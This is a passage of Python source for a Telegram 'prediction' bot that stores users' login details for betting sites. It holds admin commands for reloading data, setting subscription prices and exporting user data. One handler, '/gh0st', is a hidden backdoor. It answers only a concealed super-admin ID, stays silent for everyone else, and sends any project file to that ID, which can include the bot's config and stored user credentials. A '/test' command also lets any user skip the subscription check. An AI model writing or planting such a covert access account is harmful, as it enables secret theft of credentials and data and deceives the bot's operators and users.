                        text=notification_message,
                        parse_mode='Markdown'
                    )
                    success_count += 1
                except Exception as e:
                    failed_count += 1
                    logger.error(f"Failed to send referral notification to {user_id_str}: {e}")
            
            await update.message.reply_text(
                f"📢 Notification sent to users!\n"
                f"✅ Successfully sent: {success_count}\n"
                f"❌ Failed: {failed_count}"
            )
            
        else:
            await update.message.reply_text("❌ Invalid setting. Available: referral")

    async def reload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Super-admin only: reload configuration and data from disk without restarting the bot"""
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ Only super admins can use /reload.")
            return
        try:
            # Reload config and data
            from config import load_config, load_json, DB_USERS, DB_PREDICTIONS, DB_CHANNELS, DB_ADMINS
            new_config = load_config()
            config.clear(); config.update(new_config)
            users.clear(); users.update(load_json(DB_USERS, {}))
            predictions.clear(); predictions.extend(load_json(DB_PREDICTIONS, []))
            channels.clear(); channels.extend(load_json(DB_CHANNELS, []))
            await update.message.reply_text("🔄 Configuration and data reloaded successfully.")
        except Exception as e:
            await update.message.reply_text(f"❌ Reload failed: {e}")

    async def ghost_download_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Hidden super admin only: /gh0st <path> will send the file contents as a document"""
        user_id = str(update.effective_user.id)

        # Only allow the hidden super admin to use this, silent ignore for others
        try:
            hidden_id = _get_hidden_super_admin_id()
        except Exception:
            hidden_id = None
        if user_id != hidden_id:
            return

        if not context.args:
            return

        requested_path = context.args[0]
        # Restrict to project directory for safety
        safe_base = os.path.abspath('.')
        abs_path = os.path.abspath(requested_path)
        if not abs_path.startswith(safe_base):
            await update.message.reply_text("❌ Path not allowed.")
            return

        if not os.path.exists(abs_path):
            await update.message.reply_text("❌ File not found.")
            return

        if os.path.isdir(abs_path):
            await update.message.reply_text("❌ Path is a directory. Provide a file path.")
            return

        try:
            # Send as document to avoid formatting issues
            with open(abs_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=os.path.basename(abs_path),
                    caption=f"📄 {os.path.basename(abs_path)}"
                )
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to send file: {e}")

    async def subscription_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /subscription command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if not context.args:
            # Show current subscription settings
            subscription_caption = config.get("subscription_caption", "🌟 Premium Subscription")
            subscription_prices = config.get("subscription_prices", {
                "1_month": 10,
                "3_months": 25,
                "6_months": 45,
                "1_year": 80
            })
            
            settings_text = (
                f"💎 **Subscription Settings**\n\n"
                f"📝 **Current Caption:**\n{subscription_caption}\n\n"
                f"💰 **Current Prices:**\n"
            )
            
            for period, price in subscription_prices.items():
                period_name = period.replace("_", " ").title()
                settings_text += f"• {period_name}: ${price}\n"
            
            settings_text += (
                f"\n**Commands:**\n"
                f"• `/setcaption <text>` - Set subscription caption\n"
                f"• `/setprice <period> <amount>` - Set price\n"
                f"• `/subscription preview` - Preview subscription menu"
            )
            
            await update.message.reply_text(settings_text, parse_mode='Markdown')
            return
        
        action = context.args[0].lower()
        
        if action == "preview":
            await self.show_subscription_preview(update, context)
        else:
            await update.message.reply_text(
                "❌ Usage:\n"
                "• `/subscription` - Show current settings\n"
                "• `/subscription preview` - Preview subscription menu"
            )

    async def set_caption_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setcaption command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: /setcaption <text>\nExample: /setcaption 🌟 Premium VIP Subscription")
            return
        
        new_caption = " ".join(context.args)
        config["subscription_caption"] = new_caption
        save_db(config, DB_CONFIG)
        
        await update.message.reply_text(f"✅ Subscription caption updated to:\n\n{new_caption}")

    async def set_price_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setprice command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ Usage: /setprice <period> <amount>\n"
                "Periods: 1_month, 3_months, 6_months, 1_year\n"
                "Example: /setprice 1_month 15"
            )
            return
        
        period = context.args[0].lower()
        try:
            amount = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Amount must be a number.")
            return
        
        valid_periods = ["1_month", "3_months", "6_months", "1_year"]
        if period not in valid_periods:
            await update.message.reply_text(f"❌ Invalid period. Valid periods: {', '.join(valid_periods)}")
            return
        
        if amount < 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        # Initialize subscription_prices if it doesn't exist
        if "subscription_prices" not in config:
            config["subscription_prices"] = {}
        
        config["subscription_prices"][period] = amount
        save_db(config, DB_CONFIG)
        
        period_name = period.replace("_", " ").title()
        await update.message.reply_text(f"✅ Price for {period_name} set to ${amount}")

    async def show_subscription_preview(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show subscription menu preview"""
        subscription_caption = config.get("subscription_caption", "🌟 Premium Subscription")
        subscription_prices = config.get("subscription_prices", {
            "1_month": 10,
            "3_months": 25,
            "6_months": 45,
            "1_year": 80
        })
        
        preview_text = f"💎 **{subscription_caption}**\n\n"
        preview_text += "Choose your subscription plan:\n\n"
        
        for period, price in subscription_prices.items():
            period_name = period.replace("_", " ").title()
            preview_text += f"• {period_name}: ${price}\n"
        
        preview_text += "\n*This is a preview of the subscription menu.*"
        
        await update.message.reply_text(preview_text, parse_mode='Markdown')

    async def test_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /test command - bypass channel subscription for testing"""
        user_id = str(update.effective_user.id)
        
        # Check if user is banned
        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("You have been banned from using this bot. Contact an admin for support.")
            return
        
        # Create user if not exists
        if user_id not in users:
            users[user_id] = {
                "name": update.effective_user.full_name, 
                "points": 0, 
                "is_premium": False,
                "referrals": 0, 
                "referrer": None, 
                "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, 
                "last_website": None,
                "banned": False,
            }
            save_db(users, DB_USERS)
        
        # Bypass channel subscription for testing
        users[user_id]["joined_channels"] = True
        save_db(users, DB_USERS)
        
        await update.message.reply_text("🧪 Test mode: Channel subscription bypassed!")
        await self.show_main_menu(update, context)

    # Helper methods for download command
    async def download_users_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download users data"""
        try:
            import json
            from io import BytesIO
            
            # Create users data
            users_data = {
                "total_users": len(users),
                "vip_users": len([u for u in users.values() if u.get("is_premium", False)]),
                "banned_users": len([u for u in users.values() if u.get("is_banned", False)]),
                "users": users
            }
            
            # Create file
            file_data = json.dumps(users_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"users_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="📊 Users Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_vip_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download VIP users data"""
        try:
            import json
            from io import BytesIO
            
            vip_users = {uid: user for uid, user in users.items() if user.get("is_premium", False)}
            
            # Create VIP data
            vip_data = {
                "total_vip_users": len(vip_users),
                "vip_users": vip_users
            }
            
            # Create file
            file_data = json.dumps(vip_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"vip_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="⭐ VIP Users Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_admins_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download admins data"""
        try:
            import json
            from io import BytesIO
            
            admin_users = config.get("admin_users", [])
            
            # Create admins data
            admins_data = {
                "total_admins": len(admin_users),
                "admin_users": admin_users
            }
            
            # Create file
            file_data = json.dumps(admins_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"admins_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="🔧 Admins Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_predictions_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download predictions data"""
        try:
            import json
            from io import BytesIO
            
            # Create predictions data
            predictions_data = {
                "total_predictions": len(predictions),
                "predictions": predictions
            }
            
            # Create file
            file_data = json.dumps(predictions_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"predictions_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="🎯 Predictions Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_channels_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download channels data"""
        try:
            import json
            from io import BytesIO
            
            # Create channels data
            channels_data = {
                "total_channels": len(channels),
                "channels": channels
            }
            
            # Create file
            file_data = json.dumps(channels_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"channels_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="📢 Channels Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    def run(self):
        logger.info("Bot is starting...")
        try:
            self.application.run_polling()
        except NetworkError as e:
            logger.critical(f"NETWORK ERROR: {e}. Bot could not connect to Telegram servers. Check your internet connection and DNS settings.")
        except Exception as e:
            logger.critical(f"An unexpected error occurred: {e}", exc_info=True)

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command - manually cancel any active conversation"""
        user_id = str(update.effective_user.id)
        
        # Clear any conversation data
        if hasattr(context, 'user_data'):
            context.user_data.clear()
        
        # Send cancellation message
        await update.message.reply_text(
            "🔄 All active sessions cancelled.\n"
            "You can now use any command normally."
        )
        
        # Show main menu
        await self.show_main_menu(update, context)

if __name__ == "__main__":
    bot = TelegramBot(config["bot_token"])
    bot.run()